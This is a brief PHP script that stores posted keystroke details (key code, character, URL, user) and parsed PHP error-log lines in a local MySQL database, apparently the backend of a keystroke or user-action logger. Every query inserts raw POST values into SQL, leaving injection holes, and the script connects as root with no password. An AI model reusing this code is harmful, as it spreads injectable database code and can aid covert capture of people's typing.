<?php

    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "logs";

    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }


if( isset($_POST['user']) && 
    isset($_POST['fullKey']) && 
    isset($_POST['keyInt']) && 
    isset($_POST['keyChar']) && 
    isset($_POST['url'])){
    // User actions

    $user = $_POST['user'];
    $fullKey = $_POST['fullKey'];
    $keyInt = $_POST['keyInt'];
    $keyChar = $_POST['keyChar'];
    $url = $_POST['url'];  

    $sql = "INSERT INTO actions (user, fullKey, keyInt, keyChar, url)
    VALUES ('$user', '$fullKey', '$keyInt', '$keyChar', '$url')";

    if ($conn->query($sql) === TRUE) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }


} elseif(isset($_POST['logFile'])) {
    // Logfile to database
    //unlink('../../php.log');
    $logText = $_POST['logFile'];

    $logComponents = explode("\n", $logText);

    foreach($logComponents as $errorLine){
        $errorComponents = explode("]", $errorLine);

        

        $time = str_replace("[", "", $errorComponents[0]);
        $type = str_replace("[", "", $errorComponents[1]);
        $pid = str_replace("[", "", $errorComponents[2]);
        $client = str_replace("[", "", $errorComponents[3]);
        $error = str_replace("[", "", $errorComponents[4]);

        $sql = "INSERT INTO php (Error, Time, pid, client, type)
        VALUES ('$error', '$time', '$pid', '$client', '$type')";

        if ($conn->query($sql) === TRUE) {
            echo "New record created successfully";
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
        }
    }

} else {
    // Invalid input    
}


$conn->close();

?>